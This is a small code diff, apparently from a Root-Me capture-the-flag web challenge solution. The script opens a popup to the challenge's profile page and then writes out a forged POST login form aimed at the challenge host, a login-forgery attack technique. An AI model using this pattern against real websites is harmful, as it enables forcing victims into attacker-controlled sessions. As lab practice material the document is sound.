@@ -9,7 +9,7 @@ function sleep(ms)
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 onclick = async () => {
-  w = window.open("http://challenge01.root-me.org:58003/profile");
+  w = window.open("http://challenge01.root-me.org:58003/profile", "admin-pop");
   await sleep(5000);
   document.write('<form method="POST" action="http://challenge01.root-me.org:58003/login"><input id="username" class="mgb-1" name="username" value="aaa"></input><input id="secret" class="mgb-1" name="secret" value="bbbbaaaa"></input><button class="mgb-1" id="clickbtn" type="submit">Login</button></form>');
   //document.getElementById("clickbtn").form.submit();
